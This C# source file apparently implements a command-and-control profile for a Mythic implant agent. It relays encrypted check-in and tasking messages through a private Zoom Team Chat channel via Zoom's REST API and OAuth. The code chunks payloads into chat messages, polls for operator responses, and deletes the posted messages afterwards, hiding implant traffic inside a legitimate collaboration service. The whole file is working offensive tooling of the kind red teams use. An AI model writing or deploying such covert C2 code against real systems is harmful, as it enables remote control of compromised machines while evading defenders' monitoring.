using Agent.Interfaces;
using Agent.Models;
using Agent.Utilities;
using System.Net;
using System.Net.Http.Headers;

using System.Text.Json;

namespace Agent.Profiles
{
    // Zoom Team Chat C2 profile.
    //
    // Uses the Zoom Team Chat REST API (Server-to-Server OAuth) as a duplex
    // message bus over a single private channel. The agent posts AES-encrypted
    // checkin/get_tasking payloads to the channel as chunked JSON envelopes
    // (t = "O"); the Mythic-side "zoom" C2 profile polls the channel, relays
    // complete blobs to Mythic, and posts the encrypted responses back
    // (t = "I", addressed to this agent's correlation id). A background receive
    // loop consumes the responses.
    //
    // Crypto is end-to-end between the agent and Mythic via ICryptoManager; the
    // wire only ever carries opaque base64.
    public class ZoomProfile : IProfile
    {
        public IAgentConfig agentConfig { get; set; }
        public ICryptoManager crypt { get; set; }
        private IMessageManager messageManager { get; set; }
        private ILogger logger { get; set; }

        private readonly string accountId;
        private readonly string clientId;
        private readonly string clientSecret;
        private readonly string userId;
        private readonly string channelId;
        private readonly string apiBase;
        private readonly string oauthBase;

        // ---- wire protocol constants ----
        private const string DIR_AGENT_TO_SERVER = "O";   // consumed by the Mythic bridge
        private const string DIR_SERVER_TO_AGENT = "I";   // produced by the Mythic bridge
        private const int CHUNK_SIZE = 3000;              // base64 chars per chat message (< 4096 limit)
        private const int MAX_CHUNKS = 50;
        private const int MAX_PENDING_JOBS = 128;
        private const int MAX_PENDING_CHUNKS = 512;
        private const int MAX_PENDING_BYTES = 1024 * 1024;
        private static readonly TimeSpan PENDING_JOB_TTL = TimeSpan.FromMinutes(5);
        private const int MAX_MESSAGE_PAGES = 20;
        private const int RECEIVE_POLL_MS = 3000;         // background receiver poll interval
        private const int CHECKIN_WAIT_MS = 60000;        // how long to wait for the checkin response

        // ---- runtime state ----
        private readonly string _correlationId = Guid.NewGuid().ToString();
        private HttpClient _client { get; set; }
        private string _token = string.Empty;
        private DateTime _tokenExpiry = DateTime.MinValue;

        private CancellationTokenSource cancellationTokenSource { get; set; } = new();
        private readonly ManualResetEventSlim _checkinAvailable = new(false);
        private volatile bool _checkedIn = false;
        private CheckinResponse _checkinResponse = new();
        private readonly Dictionary<string, DateTimeOffset> _processedJobs = new();
        private readonly Dictionary<string, JobBucket> _pendingJobs = new();
        private readonly HashSet<string> _pendingDeletions = new();
        private readonly Dictionary<string, string> _deletionOwners = new();
        private readonly object _pendingDeletionsLock = new();
        private int maxPendingDeletions = 4096;
        private int _receiverStarted = 0;
        private int currentAttempt = 0;
        private int maxAttempts = 10;

        public event EventHandler<TaskingReceivedArgs>? SetTaskingReceived;

        public ZoomProfile(IAgentConfig config, ICryptoManager crypto, ILogger logger, IMessageManager messageManager)
        {
            this.agentConfig = config;
            this.crypt = crypto;
            this.logger = logger;
            this.messageManager = messageManager;
            ZoomChannelOptions? opts = null;
            try
            {
                opts = JsonSerializer.Deserialize(
                    ChannelConfig.Decode(),
                    ZoomChannelOptionsJsonContext.Default.ZoomChannelOptions);
            }
            catch (Exception ex)
            {
                this.logger.Log($"Failed to deserialize Zoom channel options: {ex.Message}");
            }
            opts ??= new ZoomChannelOptions();
            accountId = opts.AccountId ?? string.Empty;
            clientId = opts.ClientId ?? string.Empty;
            clientSecret = opts.ClientSecret ?? string.Empty;
            userId = opts.UserId ?? string.Empty;
            channelId = opts.ChannelId ?? string.Empty;
            apiBase = opts.ApiBase ?? string.Empty;
            oauthBase = opts.OAuthBase ?? string.Empty;

            HttpClientHandler handler = new HttpClientHandler();
            this._client = new HttpClient(handler);
            this._client.Timeout = TimeSpan.FromSeconds(30);

            Console.Error.WriteLine("[zoom] profile loaded");
        }

        // ===================== Zoom REST API =====================

        private async Task<string> GetToken()
        {
            // Zoom S2S tokens last ~1h; refresh ~5 min before expiry.
            if (!string.IsNullOrEmpty(_token) && DateTime.UtcNow < _tokenExpiry.AddMinutes(-5))
            {
                return _token;
            }
            string basic = Convert.ToBase64String(System.Text.Encoding.ASCII.GetBytes($"{clientId}:{clientSecret}"));
            string url = $"{oauthBase.TrimEnd('/')}/token";
            using HttpRequestMessage req = new HttpRequestMessage(HttpMethod.Post, url);
            req.Headers.Authorization = new AuthenticationHeaderValue("Basic", basic);
            var formContent = new FormUrlEncodedContent(new Dictionary<string, string>
            {
                { "grant_type", "account_credentials" },
                { "account_id", accountId },
            });
            Console.Error.WriteLine($"[zoom] OAuth POST {url} body={await formContent.ReadAsStringAsync()}");
            req.Content = formContent;
            using HttpResponseMessage resp = await _client.SendAsync(req);
            string body = await resp.Content.ReadAsStringAsync();
            if (!resp.IsSuccessStatusCode)
            {
                Console.Error.WriteLine($"[zoom] Zoom OAuth failed: {(int)resp.StatusCode} {body}");
                return string.Empty;
            }
            using JsonDocument doc = JsonDocument.Parse(body);
            _token = doc.RootElement.GetProperty("access_token").GetString() ?? string.Empty;
            int expiresIn = doc.RootElement.TryGetProperty("expires_in", out var exp) ? exp.GetInt32() : 3600;
            _tokenExpiry = DateTime.UtcNow.AddSeconds(expiresIn);
            return _token;
        }

        private HttpRequestMessage CreateBearerRequest(HttpMethod method, string relativePath, string token)
        {
            var req = new HttpRequestMessage(method, $"{apiBase.TrimEnd('/')}{relativePath}");
            req.Headers.Authorization = new AuthenticationHeaderValue("Bearer", token);
            return req;
        }

        private async Task<string?> SendChatMessage(string text)
        {
            using HttpRequestMessage req = CreateBearerRequest(HttpMethod.Post, $"/chat/users/{userId}/messages", await GetToken());
            req.Content = new StringContent(
                JsonSerializer.Serialize(new { message = text, to_channel = channelId }),
                System.Text.Encoding.UTF8,
                "application/json");
            using HttpResponseMessage resp = await _client.SendAsync(req);
            if (!resp.IsSuccessStatusCode)
            {
                return null;
            }
            string body = await resp.Content.ReadAsStringAsync();
            try
            {
                using JsonDocument doc = JsonDocument.Parse(body);
                return doc.RootElement.TryGetProperty("id", out var idEl) ? idEl.GetString() : null;
            }
            catch
            {
                return null;
            }
        }

        private async Task<List<ZoomChatMessage>> ListChatMessages()
        {
            List<ZoomChatMessage> result = new();
            string token = await GetToken();
            string? nextPageToken = null;
            for (int page = 0; page < MAX_MESSAGE_PAGES; page++)
            {
                string query = string.IsNullOrEmpty(nextPageToken)
                    ? ""
                    : $"&next_page_token={Uri.EscapeDataString(nextPageToken)}";
                using HttpRequestMessage req = CreateBearerRequest(
                    HttpMethod.Get,
                    $"/chat/users/{userId}/messages?to_channel={channelId}&page_size=50{query}",
                    token);
                using HttpResponseMessage resp = await _client.SendAsync(req);
                if (!resp.IsSuccessStatusCode)
                {
                    break;
                }

                string body = await resp.Content.ReadAsStringAsync();
                if (!TryParseMessagesPage(body, result, out nextPageToken) || string.IsNullOrEmpty(nextPageToken))
                {
                    break;
                }
            }
            return result;
        }

        private static bool TryParseMessagesPage(string body, List<ZoomChatMessage> result, out string? nextPageToken)
        {
            nextPageToken = null;
            try
            {
                using JsonDocument doc = JsonDocument.Parse(body);
                if (doc.RootElement.TryGetProperty("messages", out var msgs))
                {
                    foreach (var m in msgs.EnumerateArray())
                    {
                        string? id = m.TryGetProperty("id", out var idEl) ? idEl.GetString() : null;
                        if (string.IsNullOrWhiteSpace(id))
                        {
                            continue;
                        }
                        result.Add(new ZoomChatMessage
                        {
                            id = id,
                            message = m.TryGetProperty("message", out var msgEl) ? msgEl.GetString() ?? "" : "",
                        });
                    }
                }
                nextPageToken = doc.RootElement.TryGetProperty("next_page_token", out var next)
                    ? next.GetString()
                    : null;
                return true;
            }
            catch
            {
                return false;
            }
        }

        private async Task<bool> DeleteChatMessage(string id)
        {
            try
            {
                using HttpRequestMessage req = CreateBearerRequest(
                    HttpMethod.Delete,
                    $"/chat/users/{userId}/messages/{id}?to_channel={channelId}",
                    await GetToken());
                using HttpResponseMessage resp = await _client.SendAsync(req);
                return resp.IsSuccessStatusCode || resp.StatusCode == HttpStatusCode.NotFound;
            }
            catch
            {
                return false;
            }
        }

        private async Task DeleteOrTrack(string id)
        {
            await DeleteOrTrackOwned(id, null);
        }

        private async Task DeleteOrTrackOwned(string id, string? owner)
        {
            bool deleted = await DeleteChatMessage(id);
            lock (_pendingDeletionsLock)
            {
                if (deleted)
                {
                    _pendingDeletions.Remove(id);
                    if (_deletionOwners.TryGetValue(id, out string? completedOwner) &&
                        !_processedJobs.ContainsKey(completedOwner))
                    {
                        _deletionOwners.Remove(id);
                    }
                }
                else if (_pendingDeletions.Contains(id) || _pendingDeletions.Count < maxPendingDeletions)
                {
                    _pendingDeletions.Add(id);
                    if (owner is not null)
                    {
                        _deletionOwners[id] = owner;
                    }
                }
            }
        }

        private bool CanReserveOwnedDeletions(string job, string[] ownedIds) =>
            ownedIds.All(id => _deletionOwners.TryGetValue(id, out string? owner) && owner == job) &&
            _pendingDeletions.Count + ownedIds.Count(id => !_pendingDeletions.Contains(id)) <= maxPendingDeletions;

        private bool TryReserveProcessedJob(string job, IEnumerable<string> ids, DateTimeOffset now)
        {
            lock (_pendingDeletionsLock)
            {
                string[] ownedIds = ids.Distinct().ToArray();
                if ((!_processedJobs.ContainsKey(job) && _processedJobs.Count >= maxPendingDeletions) ||
                    !CanReserveOwnedDeletions(job, ownedIds))
                {
                    return false;
                }

                _processedJobs[job] = now.Add(PENDING_JOB_TTL);
                foreach (string id in ids)
                {
                    _pendingDeletions.Add(id);
                    _deletionOwners[id] = job;
                }
                return true;
            }
        }

        private bool TryReserveStaleCleanup(string job, IEnumerable<string> ids)
        {
            lock (_pendingDeletionsLock)
            {
                string[] ownedIds = ids.Distinct().ToArray();
                if (!CanReserveOwnedDeletions(job, ownedIds))
                {
                    return false;
                }

                foreach (string id in ownedIds)
                {
                    _pendingDeletions.Add(id);
                }
                return true;
            }
        }

        private bool TryClaimMessage(string id, string job)
        {
            lock (_pendingDeletionsLock)
            {
                if (_deletionOwners.TryGetValue(id, out string? owner))
                    return owner == job;
                if (_deletionOwners.Count >= maxPendingDeletions)
                    return false;
                _deletionOwners[id] = job;
                return true;
            }
        }

        private bool IsMessageClaimed(string id)
        {
            lock (_pendingDeletionsLock)
            {
                return _deletionOwners.ContainsKey(id);
            }
        }

        private bool DeletionCapacityExhausted()
        {
            lock (_pendingDeletionsLock)
            {
                return _pendingDeletions.Count >= maxPendingDeletions ||
                    _deletionOwners.Count >= maxPendingDeletions ||
                    _processedJobs.Count >= maxPendingDeletions;
            }
        }

        private async Task RetryPendingDeletions()
        {
            string[] pending;
            lock (_pendingDeletionsLock)
            {
                pending = _pendingDeletions.ToArray();
            }
            foreach (string id in pending)
            {
                await DeleteOrTrack(id);
            }
        }

        // ===================== Envelope / chunking =====================

        private static List<string> Chunk(string s)
        {
            List<string> chunks = new();
            if (string.IsNullOrEmpty(s))
            {
                chunks.Add("");
                return chunks;
            }
            for (int i = 0; i < s.Length; i += CHUNK_SIZE)
            {
                chunks.Add(s.Substring(i, Math.Min(CHUNK_SIZE, s.Length - i)));
            }
            return chunks;
        }

        // Posts an encrypted blob to the channel as one or more chunked envelopes
        // addressed from this agent (correlation id) to Mythic.
        private async Task<bool> PostEncrypted(string direction, string encrypted)
        {
            string job = Guid.NewGuid().ToString();
            List<string> chunks = Chunk(encrypted);
            if (chunks.Count > MAX_CHUNKS)
                return false;
            List<string> postedMessageIds = new();
            for (int seq = 0; seq < chunks.Count; seq++)
            {
                string envelope = JsonSerializer.Serialize(new ZoomEnvelope
                {
                    t = direction,
                    c = _correlationId,
                    j = job,
                    s = seq,
                    n = chunks.Count,
                    d = chunks[seq],
                });
                string? messageId = await SendChatMessage(envelope);
                if (messageId is null)
                {
                    foreach (string postedMessageId in postedMessageIds)
                    {
                        await DeleteOrTrack(postedMessageId);
                    }
                    return false;
                }
                postedMessageIds.Add(messageId);
            }
            return true;
        }

        private static bool TryParseEnvelope(string text, out ZoomEnvelope env)
        {
            env = new ZoomEnvelope();
            if (string.IsNullOrEmpty(text) || !text.TrimStart().StartsWith("{"))
                return false;
            try
            {
                env = JsonSerializer.Deserialize<ZoomEnvelope>(text) ?? new ZoomEnvelope();
                return (env.t == DIR_AGENT_TO_SERVER || env.t == DIR_SERVER_TO_AGENT)
                    && !string.IsNullOrWhiteSpace(env.c)
                    && !string.IsNullOrWhiteSpace(env.j)
                    && env.n > 0
                    && env.n <= MAX_CHUNKS
                    && env.s >= 0
                    && env.s < env.n
                    && env.d is not null
                    && env.d.Length <= CHUNK_SIZE;
            }
            catch
            {
                env = new ZoomEnvelope();
                return false;
            }
        }

        // ===================== Receive loop =====================

        private void EnsureReceiver()
        {
            if (Interlocked.CompareExchange(ref _receiverStarted, 1, 0) == 0)
            {
                _ = Task.Run(ReceiveLoop);
            }
        }

        private async Task ReceiveLoop()
        {
            while (!cancellationTokenSource.Token.IsCancellationRequested)
            {
                try
                {
                    await ProcessInbound();
                }
                catch
                {
                }
                try
                {
                    await Task.Delay(RECEIVE_POLL_MS, cancellationTokenSource.Token);
                }
                catch
                {
                    return;
                }
            }
        }

        private async Task ProcessInbound()
        {
            await ProcessInbound(DateTimeOffset.UtcNow);
        }

        private async Task ProcessInbound(DateTimeOffset now)
        {
            PruneExpiredProcessedJobs(now);
            await RetryPendingDeletions();
            await CleanupStalePendingJobs(now);
            if (DeletionCapacityExhausted())
            {
                return;
            }

            List<ZoomChatMessage> messages = await ListChatMessages();
            foreach (var msg in messages)
            {
                await AccumulateInboundMessage(msg, now);
            }

            foreach ((string job, JobBucket bucket) in _pendingJobs.ToArray())
            {
                if (_processedJobs.ContainsKey(job) || bucket.invalid)
                {
                    foreach (string id in bucket.ids)
                    {
                        await DeleteOrTrack(id);
                    }
                    _pendingJobs.Remove(job);
                    continue;
                }
                if (bucket.chunks.Count != bucket.total)
                {
                    continue;
                }
                if (!await TryCompleteJob(job, bucket, now))
                {
                    break;
                }
            }
        }

        private void PruneExpiredProcessedJobs(DateTimeOffset now)
        {
            lock (_pendingDeletionsLock)
            {
                foreach (string job in _processedJobs.Where(entry => entry.Value <= now).Select(entry => entry.Key).ToArray())
                {
                    if (_deletionOwners.Any(entry => entry.Value == job && _pendingDeletions.Contains(entry.Key)))
                    {
                        continue;
                    }
                    _processedJobs.Remove(job);
                    foreach (string id in _deletionOwners.Where(entry => entry.Value == job).Select(entry => entry.Key).ToArray())
                    {
                        _deletionOwners.Remove(id);
                    }
                }
            }
        }

        private async Task CleanupStalePendingJobs(DateTimeOffset now)
        {
            foreach ((string job, JobBucket bucket) in _pendingJobs.ToArray())
            {
                if (now - bucket.created <= PENDING_JOB_TTL || !TryReserveStaleCleanup(job, bucket.ids))
                {
                    continue;
                }

                _pendingJobs.Remove(job);
                foreach (string id in bucket.ids)
                {
                    await DeleteOrTrackOwned(id, job);
                }
            }
        }

        private async Task AccumulateInboundMessage(ZoomChatMessage msg, DateTimeOffset now)
        {
            if (!TryParseEnvelope(msg.message, out ZoomEnvelope env))
            {
                if (env.t == DIR_SERVER_TO_AGENT && env.c == _correlationId && !IsMessageClaimed(msg.id))
                {
                    await DeleteOrTrack(msg.id);
                }
                return;
            }
            if (env.t != DIR_SERVER_TO_AGENT || env.c != _correlationId || env.j == null)
            {
                return;
            }
            bool isNewJob = !_pendingJobs.TryGetValue(env.j, out JobBucket? bucket);
            if (isNewJob && _pendingJobs.Count >= MAX_PENDING_JOBS)
            {
                if (!IsMessageClaimed(msg.id))
                {
                    await DeleteOrTrack(msg.id);
                }
                return;
            }
            if (!isNewJob && bucket!.chunks.TryGetValue(env.s, out string? existingChunk))
            {
                if (existingChunk != env.d)
                {
                    bucket.invalid = true;
                }
                if (!IsMessageClaimed(msg.id))
                {
                    await DeleteOrTrack(msg.id);
                }
                return;
            }
            if (!TryClaimMessage(msg.id, env.j))
            {
                return;
            }
            if (isNewJob)
            {
                bucket = new JobBucket { total = env.n, created = now };
                _pendingJobs[env.j] = bucket;
            }
            else if (bucket!.total != env.n)
            {
                bucket.invalid = true;
            }

            if (!bucket!.ids.Add(msg.id))
            {
                return;
            }
            if (!bucket.chunks.ContainsKey(env.s) &&
                (PendingChunkCount() >= MAX_PENDING_CHUNKS ||
                 env.d!.Length > MAX_PENDING_BYTES - PendingChunkBytes()))
            {
                bucket.ids.Remove(msg.id);
                if (bucket.chunks.Count == 0)
                {
                    _pendingJobs.Remove(env.j);
                }
                await DeleteOrTrack(msg.id);
                return;
            }
            if (!bucket.chunks.TryAdd(env.s, env.d!) && bucket.chunks[env.s] != env.d)
            {
                bucket.invalid = true;
            }
        }

        private async Task<bool> TryCompleteJob(string job, JobBucket bucket, DateTimeOffset now)
        {
            string encrypted = string.Concat(Enumerable.Range(0, bucket.total).Select(i => bucket.chunks[i]));
            CheckinResponse? checkinResponse = null;
            GetTaskingResponse? taskingResponse = null;
            if (TryDecryptJobPayload(encrypted, out string plain))
            {
                if (!_checkedIn)
                {
                    checkinResponse = TryParseCheckinPayload(plain);
                }
                else
                {
                    taskingResponse = TryParseTaskingPayload(plain);
                }
            }

            if (!TryReserveProcessedJob(job, bucket.ids, now))
            {
                return false;
            }

            _pendingJobs.Remove(job);
            if (checkinResponse is not null)
            {
                _checkinResponse = checkinResponse;
                _checkinAvailable.Set();
                _checkedIn = true;
            }
            else if (taskingResponse is not null)
            {
                this.SetTaskingReceived?.Invoke(this, new TaskingReceivedArgs(taskingResponse));
            }

            foreach (string id in bucket.ids)
            {
                await DeleteOrTrackOwned(id, job);
            }
            return true;
        }

        private bool TryDecryptJobPayload(string encrypted, out string plain)
        {
            try
            {
                plain = crypt.Decrypt(encrypted);
                return !string.IsNullOrEmpty(plain);
            }
            catch (FormatException)
            {
                plain = string.Empty;
                return false;
            }
        }

        private static CheckinResponse? TryParseCheckinPayload(string plain)
        {
            try
            {
                CheckinResponse? response = JsonSerializer.Deserialize(plain, CheckinResponseJsonContext.Default.CheckinResponse);
                return CheckinResponseValidation.IsSuccessful(response) ? response : null;
            }
            catch (JsonException)
            {
                return null;
            }
        }

        private static GetTaskingResponse? TryParseTaskingPayload(string plain)
        {
            try
            {
                GetTaskingResponse? gtr = JsonSerializer.Deserialize(plain, GetTaskingResponseJsonContext.Default.GetTaskingResponse);
                return gtr?.action == "get_tasking" ? gtr : null;
            }
            catch (JsonException)
            {
                return null;
            }
        }

        // ===================== IProfile =====================

        public async Task<CheckinResponse> Checkin(Checkin checkin)
        {
            EnsureReceiver();

            string encrypted = crypt.Encrypt(JsonSerializer.Serialize(checkin, CheckinJsonContext.Default.Checkin));
            try
            {
                if (!await PostEncrypted(DIR_AGENT_TO_SERVER, encrypted))
                {
                    Console.Error.WriteLine("[zoom] checkin post failed: Zoom rejected an outbound chat message.");
                    return new CheckinResponse() { status = "failed" };
                }
            }
            catch (Exception e)
            {
                Console.Error.WriteLine($"[zoom] checkin post failed: {e}");
                return new CheckinResponse() { status = "failed" };
            }

            // Wait for the bridge to relay and return a checkin response.
            if (!_checkinAvailable.Wait(CHECKIN_WAIT_MS, cancellationTokenSource.Token))
            {
                return new CheckinResponse() { status = "failed" };
            }
            return _checkinResponse;
        }

        public async Task StartBeacon()
        {
            //Main beacon loop handled here
            EnsureReceiver();

            while (!cancellationTokenSource.Token.IsCancellationRequested)
            {
                try
                {
                    await Task.Delay(Misc.GetSleep(this.agentConfig.sleep, this.agentConfig.jitter) * 1000, cancellationTokenSource.Token);
                }
                catch (OperationCanceledException) when (cancellationTokenSource.IsCancellationRequested)
                {
                    break;
                }
                try
                {
                    // Poll every tick, including with an empty get_tasking payload.
                    bool delivered = await messageManager.DeliverAsync(
                        payload => PostEncrypted(DIR_AGENT_TO_SERVER, crypt.Encrypt(payload)),
                        result => result);
                    this.currentAttempt = delivered ? 0 : this.currentAttempt + 1;
                }
                catch (Exception e)
                {
                    Console.Error.WriteLine($"[zoom] beacon tick failed: {e}");
                    this.currentAttempt++;
                }

                if (this.currentAttempt >= this.maxAttempts)
                {
                    this.cancellationTokenSource.Cancel();
                }
            }
        }

        public bool StopBeacon()
        {
            this.cancellationTokenSource.Cancel();
            return true;
        }

        // ===================== Helpers =====================

        private int PendingChunkCount() => _pendingJobs.Values.Sum(bucket => bucket.chunks.Count);

        private int PendingChunkBytes() => _pendingJobs.Values.Sum(bucket => bucket.chunks.Values.Sum(chunk => chunk.Length));

        private class ZoomEnvelope
        {
            public string? t { get; set; }
            public string? c { get; set; }
            public string? j { get; set; }
            public int s { get; set; }
            public int n { get; set; }
            public string? d { get; set; }
        }

        private class ZoomChatMessage
        {
            public string id { get; set; } = string.Empty;
            public string message { get; set; } = string.Empty;
        }

        private class JobBucket
        {
            public int total;
            public bool invalid;
            public DateTimeOffset created;
            public Dictionary<int, string> chunks = new();
            public HashSet<string> ids = new();
        }
    }
}
